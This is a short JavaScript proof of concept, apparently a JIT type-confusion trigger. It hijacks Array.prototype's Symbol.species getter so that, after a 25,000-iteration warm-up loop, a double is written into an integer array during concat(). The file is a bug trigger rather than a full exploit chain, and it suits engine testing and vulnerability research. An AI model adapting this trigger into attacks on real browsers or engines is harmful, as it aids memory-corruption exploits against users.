let trigger_flag = false;
const v3 = Array.prototype;
const v5 = Symbol.species;
function f6() {
    if (trigger_flag) {
        this[0] = 1.1;
    }
    return Array;
}
Object.defineProperty(v3, v5, { get: f6 });
function poc(a13) {
    let a = a13[0];
    a13.concat();
    return a13[0] + a;
}
for (let i20 = 0; i20 < 25000; i20++) {
    trigger_flag = i20 === 24999;
    let a = [0,1,2,3,4];
    poc(a);
}
